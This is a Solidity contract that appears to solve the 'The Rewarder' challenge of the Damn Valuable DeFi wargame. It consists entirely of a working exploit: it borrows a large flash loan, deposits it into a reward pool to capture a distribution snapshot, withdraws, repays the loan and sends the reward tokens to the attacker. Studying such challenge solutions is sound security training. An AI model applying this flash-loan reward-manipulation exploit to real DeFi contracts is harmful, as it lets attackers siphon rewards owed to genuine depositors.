// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";
import {AccountingToken} from "./AccountingToken.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";

contract TheRewarderAttack is Test {
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;

    DamnValuableToken public immutable dvt;
    TheRewarderPool public immutable theRewarderPool;
    RewardToken public immutable rewardToken;
    AccountingToken public immutable accountingToken;
    FlashLoanerPool public immutable flashLoanerPool;
    address public immutable attacker;

    constructor(
        address _dvt,
        address _theRewarderPool,
        address _rewardToken,
        address _accountingToken,
        address _flashLoanerPool
    ) {
        dvt = DamnValuableToken(_dvt);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        rewardToken = RewardToken(_rewardToken);
        accountingToken = AccountingToken(_accountingToken);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        attacker = msg.sender;
    }

    function attack() external {
        flashLoanerPool.flashLoan(TOKENS_IN_LENDER_POOL);
    }

    function receiveFlashLoan(uint256 amount) external {
        // 1. Approve theRewarderPool to transfer the DVT tokens
        dvt.approve(address(theRewarderPool), amount);
        // 2. Deposit to theRewarderPool, includes reward distribution
        theRewarderPool.deposit(amount);
        // 3. Distribute rewards
        theRewarderPool.distributeRewards();
        // 4. Withdraw from theRewarderPool
        theRewarderPool.withdraw(amount);
        // 5. Transfer the DVT tokens back to the flash loaner pool
        dvt.transfer(address(flashLoanerPool), amount);
        // 6. Transfer reward tokens to the attacker
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
